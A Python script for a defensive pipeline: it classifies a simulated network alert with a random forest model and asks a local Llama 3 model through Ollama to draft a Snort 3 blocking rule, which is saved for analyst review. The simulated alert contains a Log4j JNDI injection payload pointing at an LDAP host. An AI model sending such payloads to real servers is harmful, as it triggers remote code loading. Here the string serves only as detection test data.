import joblib
import ollama
import pandas as pd

def generate_snort_rule_prompt(alert_info):
    """
    Constructs a detailed prompt for Ollama to generate a Snort rule.
    """
    prompt = f"""
    As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
    A new, suspicious network event has been detected with the following details:

    - **Alert Message**: "{alert_info['message']}"
    - **Source IP**: {alert_info['source_ip']}
    - **Destination Port**: {alert_info['dest_port']}
    - **Protocol**: {alert_info['protocol']}

    Based on this information, generate a Snort 3 rule that will block future attempts from this specific source IP.
    The rule should be in the correct Snort 3 syntax. For example:
    `alert tcp any any -> $HOME_NET 80 (msg:"..."; sid:1000005; rev:1;)`
    
    Provide only the Snort rule as your response.
    """
    return prompt

# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load the pre-trained model pipeline
    try:
        model_pipeline = joblib.load('random_forest_pipeline.joblib')
    except FileNotFoundError:
        print("Error: Model pipeline file 'random_forest_pipeline.joblib' not found.")
        print("Please run the updated train_model.py script first to create it.")
        exit()

    # 2. Simulate a new, unseen, suspicious alert (Log4j)
    new_alert_text = 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1'
    new_alert_info = {
        'message': new_alert_text,
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # Create a pandas DataFrame from the new alert, as the pipeline expects it
    new_alert_df = pd.DataFrame([{
        'message': new_alert_info['message'],
        'dest_port': int(new_alert_info['dest_port'])
    }])

    # 3. Use our improved model pipeline to classify the new alert
    prediction = model_pipeline.predict(new_alert_df)

    # 4. If the model classifies it as malicious, ask Ollama for a rule
    if prediction[0] == 1:
        print(f"SUCCESS: The improved model correctly classified the new threat as MALICIOUS.")
        print(f"Detected activity: '{new_alert_text}'")
        print("\nAsking Ollama to generate a new Snort rule...")
        
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3',
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            suggested_rule = response['message']['content']
            print("\n--- Ollama's Suggested Snort Rule ---")
            print(suggested_rule)
            print("---------------------------------------")

            with open("suggested_rules.txt", "a") as f:
                f.write(suggested_rule + "\n\n")
            print("Rule saved to suggested_rules.txt for analyst review.")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
            print("Please ensure the Ollama service is running and you have the 'llama3' model.")
            
    else:
        print(f"FAILURE: The improved model still classified the new threat as BENIGN.")
        print("This indicates more diverse training data or more advanced features are needed.")